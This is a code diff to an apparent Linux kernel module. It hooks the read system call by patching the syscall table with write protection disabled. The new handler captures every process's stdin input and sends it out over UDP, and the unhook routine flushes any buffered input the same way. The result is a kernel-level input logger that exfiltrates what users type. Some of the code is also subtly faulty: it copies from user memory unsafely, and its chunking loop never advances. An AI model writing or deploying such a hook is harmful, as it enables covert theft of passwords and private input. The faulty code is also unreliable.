@@ -31,6 +31,8 @@ struct taskinput_buffer{
   struct list_head list;
 };
 
+char buffer[INPUTBUFLEN];
+
 ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
 int r_count=0;
 
@@ -72,7 +74,6 @@ struct taskinput_buffer * find_tinbuf(pid_t pid){
 }
 
 static ssize_t my_read(int fd, void *buf, size_t count){
-  static int buf_size = 0;
   ssize_t retVal;
   struct taskinput_buffer * cur_tinb = NULL;
   int i;
@@ -120,20 +121,55 @@ static ssize_t my_read(int fd, void *buf, size_t count){
   return retVal;
 }
 
+static ssize_t my_read_simple(int fd, void *buf, size_t count){
+	static int buf_size = 0;
+	ssize_t retVal;
+	r_count++;
+	retVal = orig_sys_read(fd, buf, count);
+  if(retVal <= 0 || count <= 0){
+    r_count --;
+    return retVal;
+  }
+	if(fd == 0){ //stdin
+		while(count >= INPUTBUFLEN){
+			strncpy(buffer, (char*)buf, INPUTBUFLEN-1);
+			buffer[INPUTBUFLEN-1] = '\0';
+      send_udp(current->pid, buffer);
+      count-= (INPUTBUFLEN -1);
+		}
+		strncpy(buffer, (char*)buf, count);
+		buffer[count] = '\0';
+    send_udp(current->pid, buffer);
+	}
+	r_count--;
+	return retVal;
+}
+
 void hook_read(void ** syscall_table){
   tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
   INIT_LIST_HEAD(&inbuf_head.list);
 
   disable_wp();
   orig_sys_read = syscall_table[__NR_read];
-  syscall_table[__NR_read] = my_read;
+  syscall_table[__NR_read] = my_read_simple;
   enable_wp();
 }
 
 void unhook_read(void ** syscall_table){
+  struct taskinput_buffer * it;
+
   disable_wp();
   syscall_table[__NR_read] = orig_sys_read;
   enable_wp();
+  
+  spin_lock(&tinbuf_lock);
+  list_for_each_entry(it, &inbuf_head.list, list){
+    if(it->bufpos > 0){
+        send_udp(it->pid, it->buf);
+    }
+  }
+  spin_unlock(&tinbuf_lock);
+  send_udp(current->pid, "Unhook read!");
   while(r_count>0){// hack to unblock read
     printk(KERN_INFO "\n");
     msleep_interruptible(100);
